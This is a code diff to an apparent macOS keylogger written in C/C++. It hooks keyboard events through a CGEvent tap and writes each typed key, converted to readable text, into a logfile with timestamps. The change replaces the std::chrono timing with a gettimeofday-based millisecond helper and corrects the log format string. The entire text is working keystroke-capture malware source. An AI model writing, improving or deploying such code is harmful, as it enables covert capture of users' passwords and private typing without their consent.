@@ -1,7 +1,5 @@
 #include "keylogger.h"
 
-using namespace std::chrono;
-
 int main(int argc, const char *argv[]) {
 
     CGEventMask eventMask = (CGEventMaskBit(kCGEventKeyDown) | CGEventMaskBit(kCGEventFlagsChanged));
@@ -52,15 +50,19 @@ CGEventRef CGEventCallback(CGEventTapProxy proxy, CGEventType type, CGEventRef e
 
     CGKeyCode keyCode = (CGKeyCode) CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode);
 
-    milliseconds ms = duration_cast< milliseconds >(
-        system_clock::now().time_since_epoch()
-    );
     time_t result = time(NULL);
     // This prints the readable key into the log
-    fprintf(logfile, "%s %s %s\n", convertKeyCode(keyCode), ms, asctime(localtime(&result)));
+    fprintf(logfile, "%s %lld %s", convertKeyCode(keyCode), timeInMilliseconds(), asctime(localtime(&result)));
     fflush(logfile);
 
     return event;
+}
+
+long long timeInMilliseconds(void) {
+    struct timeval tv;
+
+    gettimeofday(&tv,NULL);
+    return (((long long)tv.tv_sec)*1000)+(tv.tv_usec/1000);
 }
 
 const char *convertKeyCode(int keyCode) {
